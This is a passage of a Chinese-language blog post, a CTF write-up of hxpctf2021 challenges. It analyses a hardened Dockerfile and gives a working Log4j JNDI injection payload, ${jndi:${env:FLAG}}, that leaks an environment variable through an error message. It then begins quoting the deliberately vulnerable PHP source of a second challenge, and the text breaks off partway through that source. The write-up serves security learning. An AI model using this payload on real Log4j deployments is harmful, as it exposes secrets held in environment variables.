<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="hxpctf2021å¤ç°è¿˜æ˜¯è¹­çš„ç§‘æ©çš„è½¦ï¼Œè™½ç„¶èœç‹—å¾ˆåŠªåŠ›çš„çœ‹äº†ä¸€å¤©åŠï¼Œä½†çœŸçš„èœï¼Œä¸ä¼šå°±æ˜¯ä¸ä¼šï¼Œæ‰€ä»¥ä»ç„¶å†…å®¹ä¸»é¢˜æ˜¯å¤ç°ï¼ˆä»¥åŠhxpè¿™æŠŠæ‰€æœ‰webçš„dockerfileéƒ½éå¸¸å¤æ‚ï¼Œè¿›è¡Œäº†ç©¶ææƒé™æ§åˆ¶ï¼‰ï¼ˆè¿™æŠŠåœ¨miscé‡Œé¢æœ‰ä¸€ä¸ªlog4jçš„é¢˜ï¼‰ Log 4 sanity checklog4jé¢˜ï¼Œç­¾åˆ°éš¾åº¦ã€‚ç»™äº†é™„ä»¶ï¼Œclassç›´æ¥åæ±‡ç¼–å‡ºæ¥ï¼Œå°±æ˜¯ncä¸Šå»è¾“ä¸€ä¸ªå­—ç¬¦ä¸²ç„¶åç›´æ¥log4jæ‰“å°ä¸€ä¸‹è§¦å‘ ç©¶ædo">
<meta property="og:type" content="article">
<meta property="og:title" content="hxpctf2021å¤ç°">
<meta property="og:url" content="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="hxpctf2021å¤ç°è¿˜æ˜¯è¹­çš„ç§‘æ©çš„è½¦ï¼Œè™½ç„¶èœç‹—å¾ˆåŠªåŠ›çš„çœ‹äº†ä¸€å¤©åŠï¼Œä½†çœŸçš„èœï¼Œä¸ä¼šå°±æ˜¯ä¸ä¼šï¼Œæ‰€ä»¥ä»ç„¶å†…å®¹ä¸»é¢˜æ˜¯å¤ç°ï¼ˆä»¥åŠhxpè¿™æŠŠæ‰€æœ‰webçš„dockerfileéƒ½éå¸¸å¤æ‚ï¼Œè¿›è¡Œäº†ç©¶ææƒé™æ§åˆ¶ï¼‰ï¼ˆè¿™æŠŠåœ¨miscé‡Œé¢æœ‰ä¸€ä¸ªlog4jçš„é¢˜ï¼‰ Log 4 sanity checklog4jé¢˜ï¼Œç­¾åˆ°éš¾åº¦ã€‚ç»™äº†é™„ä»¶ï¼Œclassç›´æ¥åæ±‡ç¼–å‡ºæ¥ï¼Œå°±æ˜¯ncä¸Šå»è¾“ä¸€ä¸ªå­—ç¬¦ä¸²ç„¶åç›´æ¥log4jæ‰“å°ä¸€ä¸‹è§¦å‘ ç©¶ædo">
<meta property="og:locale">
<meta property="article:published_time" content="2021-12-20T05:34:19.000Z">
<meta property="article:modified_time" content="2022-01-06T10:11:33.804Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>hxpctf2021å¤ç° | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="æœç´¢..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="ä¸å…¶æ„Ÿæ…¨è·¯éš¾è¡Œï¼Œä¸å¦‚ç°åœ¨å‡ºå‘">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hxpctf2021å¤ç°
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-12-20 13:34:19" itemprop="dateCreated datePublished" datetime="2021-12-20T13:34:19+08:00">2021-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-01-06 18:11:33" itemprop="dateModified" datetime="2022-01-06T18:11:33+08:00">2022-01-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">åˆ·é¢˜è®°å½•</span></a>
                </span>
            </span>

          
            <span id="/hxpctf2021%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="hxpctf2021å¤ç°" title="é˜…è¯»æ¬¡æ•°">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valineï¼š</span>
    
    <a title="valine" href="/hxpctf2021%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/hxpctf2021%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="hxpctf2021å¤ç°"><a href="#hxpctf2021å¤ç°" class="headerlink" title="hxpctf2021å¤ç°"></a>hxpctf2021å¤ç°</h1><p>è¿˜æ˜¯è¹­çš„ç§‘æ©çš„è½¦ï¼Œè™½ç„¶èœç‹—å¾ˆåŠªåŠ›çš„çœ‹äº†ä¸€å¤©åŠï¼Œä½†çœŸçš„èœï¼Œä¸ä¼šå°±æ˜¯ä¸ä¼šï¼Œæ‰€ä»¥ä»ç„¶å†…å®¹ä¸»é¢˜æ˜¯å¤ç°ï¼ˆä»¥åŠhxpè¿™æŠŠæ‰€æœ‰webçš„dockerfileéƒ½éå¸¸å¤æ‚ï¼Œè¿›è¡Œäº†ç©¶ææƒé™æ§åˆ¶ï¼‰<br>ï¼ˆè¿™æŠŠåœ¨miscé‡Œé¢æœ‰ä¸€ä¸ªlog4jçš„é¢˜ï¼‰</p>
<h2 id="Log-4-sanity-check"><a href="#Log-4-sanity-check" class="headerlink" title="Log 4 sanity check"></a>Log 4 sanity check</h2><p>log4jé¢˜ï¼Œç­¾åˆ°éš¾åº¦ã€‚ç»™äº†é™„ä»¶ï¼Œclassç›´æ¥åæ±‡ç¼–å‡ºæ¥ï¼Œå°±æ˜¯ncä¸Šå»è¾“ä¸€ä¸ªå­—ç¬¦ä¸²ç„¶åç›´æ¥log4jæ‰“å°ä¸€ä¸‹è§¦å‘</p>
<h3 id="ç©¶ædockerfile"><a href="#ç©¶ædockerfile" class="headerlink" title="ç©¶ædockerfile"></a>ç©¶ædockerfile</h3><p>ç»™äº†ä¸€ä¸ªè¶…é•¿dockerfileã€‚ã€‚ã€‚hxpçš„dockerfileåŸºæœ¬ä¸Šéƒ½è¿™ä¹ˆé•¿ï¼Œè¿›è¡Œäº†å„ç§ç©¶æçš„æƒé™æ§åˆ¶ï¼Œæ“ä½œä¹Ÿéƒ½ç±»ä¼¼</p>
<pre class=" language-dockerfile"><code class="language-dockerfile"># Running locally:
# 1) echo 'hxp{FLAG}' > flag.txt
# 2) docker build -t log4sanitycheck .
# 3) docker run -p 1337:1024 --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -it log4sanitycheck

FROM debian:bullseye

# Install deps.
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        default-jre-headless && \
    rm -rf /var/lib/apt/lists/

# Set up the flag
COPY flag.txt docker-stuff/readflag /
RUN chown root:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

# Set up ynetd and the launcher
RUN useradd --create-home --shell /bin/bash ctf
WORKDIR /home/ctf
COPY Vuln.class run.sh *.xml *.jar /home/ctf/
COPY ynetd /sbin/
RUN chmod 555 /home/ctf && \
    chown -R root:root /home/ctf && \
    chmod -R 000 /home/ctf/* && \
    chmod 500 /sbin/ynetd && \
    chmod 005 /home/ctf/run.sh && \
    chmod 004 /home/ctf/*.class /home/ctf/*.jar /home/ctf/*.xml

# We're paranoid
RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER ctf
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/tmp|/var/tmp|/var/lock|/var/mail|/var/spool/mail)'

# Run
USER root
EXPOSE 1024
CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
</code></pre>
<p>æœ€å¼€å§‹çš„ä¸‹è½½ä¸œè¥¿è¿˜æ¯”è¾ƒæ­£å¸¸ï¼Œç„¶åé€æ¸å˜å¾—ç¦»è°±ã€‚<br>ä¸Šæ¥å°±ç»™flag040ï¼Œå†é…åˆä¸€ä¸ªsetUIDçš„readflagï¼Œä¹‹åå„ç§é™åˆ¶æƒé™ï¼Œèƒ½ç»™0çš„éƒ½ç»™0<br><code>We&#39;re paranoid</code>ä¸‹é¢é‚£æ®µä»£ç å¤§æ¦‚æ˜¯åœ¨æŠŠreadflagä»¥å¤–çš„æ‰€æœ‰ç‰¹æƒç¨‹åºå…¨éƒ½åˆ æ‰ï¼Œç„¶åæ£€æŸ¥ä¸€ä¸‹findï¼Œidï¼Œsedï¼Œgrepè¿™å‡ ä¸ªå‘½ä»¤æ˜¯ä¸æ˜¯å­˜åœ¨<br>grep -Eé€‰é¡¹å¯ç”¨æ­£åˆ™ï¼Œ-vé€‰é¡¹åªæ˜¾ç¤ºä¸åŒ¹é…é¡¹ç›®ï¼Œ-mé€‰é¡¹ä¸ºåŒ¹é…è¡Œæ•°ï¼Œå¤§æ¦‚å°±æ˜¯åªåŒ¹é…ä¸æ˜¯è¿™äº›ç›®å½•ä¸‹çš„å±äºå½“å‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·å¯å†™çš„æ–‡ä»¶ï¼ˆæš‚æ—¶æ²¡çœ‹å‡ºæ¥é‚£ä¸ªæ„Ÿå¹å·æœ‰ä»€ä¹ˆç”¨ï¼‰ï¼Œä½†-m 1åªåŒ¹é…ä¸€è¡Œï¼Œä¸çŸ¥é“ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªè¿™æ ·çš„æ–‡ä»¶è€Œç¬¬ä¸€è¡Œåœ¨è§„å®šçš„<code>/dev/|/run/|/proc/...</code>è¿™äº›ç›®å½•é‡Œé¢ï¼Œä¸å°±ä¼šæ˜¾ç¤ºåŒ¹é…ä¸ä¸Šäº†ï¼Ÿ</p>
<h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>è¦æ‰“åˆ°å‘½ä»¤æ‰§è¡Œï¼Œè€Œlog4jè¦æ‰“åˆ°å‘½ä»¤æ‰§è¡Œç”¨çš„æ˜¯jndiæ³¨å…¥ï¼Œè¦ä¹ˆè¿œå¤ç‰ˆæœ¬jdkç›´æ¥referenceæ‰“é€šï¼Œè¦ä¹ˆtomcatç‰ˆæœ¬ç‰¹æ®Šç”¨å¯¹åº”factoryæ‰“ï¼Œè¦ä¹ˆæœ¬åœ°è‡ªå¸¦CCä¹‹ç±»çš„ä¸€å¥—é“¾ã€‚æ˜¾ç„¶è¿™é‡Œä¸€ä¸ªæ¡ä»¶çš„ä¸ç¬¦åˆ<br><code>CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 &quot;FLAG=&#39;$(cat /flag.txt)&#39; /home/ctf/run.sh&quot;</code><br>ä½†æ˜¯çœ‹åˆ°æœ€åRUNè¿è¡Œçš„è¿™å¥ï¼Œæ˜¯ä»¥rootç›´æ¥èµ·äº†è¿™ä¸ªynetdï¼Œè™½ç„¶ä¸çŸ¥é“è¿™ä¸ªæ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æœ‰ä¸€å¥<code>FLAG=&#39;$(cat /flag.txt)</code>ï¼ŒæŠŠflagå¡è¿›äº†ç¯å¢ƒå˜é‡ã€‚<br>log4jåœ¨çˆ†å‡ºæ¼æ´çš„æ—¶å€™å› ä¸ºé€šæ€ä¸€ä¸ªdnslogéªŒè¯ï¼Œæ‰€ä»¥å¤§å®¶ä¹Ÿå°±æƒ³å‡ºäº†dnslogå¤–å¸¦çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹çœ‹jdk versionä¹‹ç±»çš„ï¼Œè¿™é‡ŒåŒæ ·ä¹Ÿå¯ä»¥å¤–å¸¦flag</p>
<p>ä¸€å¼€å§‹å› ä¸ºæ˜¯è¦è‡ªå·±æ­ä¸€ä¸ªdnslogçš„ï¼Œåæ¥å‘ç°ç›´æ¥æŠ¥é”™ä¹Ÿä¼šå›æ˜¾ï¼Œç›´æ¥<br><code>$&#123;jndi:$&#123;env:FLAG&#125;&#125;</code>å³å¯åœ¨æŠ¥é”™ä¸­æ‹¿åˆ°flag</p>
<p><code>hxp&#123;Phew, I am glad I code everything in PHP anyhow :) - :( :( :(&#125;</code></p>
<p>ä»¥åŠä»–ä»¬çš„flagéƒ½é•¿çš„ä¸€é€¼</p>
<h2 id="shitty-blog"><a href="#shitty-blog" class="headerlink" title="shitty blog"></a>shitty blog</h2><p>æˆ‘è§‰å¾—è¿˜æŒºéš¾çš„ :(</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">// TODO: fully implement multi-user / guest feature :(</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'./data/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:'</span><span class="token punctuation">.</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/blog.sqlite3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_EMULATE_PREPARES</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$schema</span> <span class="token operator">=</span> "
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span><span class="token punctuation">,</span> name <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token constant">AUTOINCREMENT</span><span class="token punctuation">,</span> user_id <span class="token constant">INTEGER</span><span class="token punctuation">,</span> content <span class="token constant">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">user</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> user_id<span class="token punctuation">,</span> content<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'Welcome to your new blog - ğŸš©ğŸš©ğŸš© Ê•â€¢Ìá´¥â€¢Ì€Ê”ã£ğŸ¤ ğŸš©ğŸš©ğŸš©'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
"<span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$schema</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT id, user_id, content FROM entry ORDER BY id DESC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
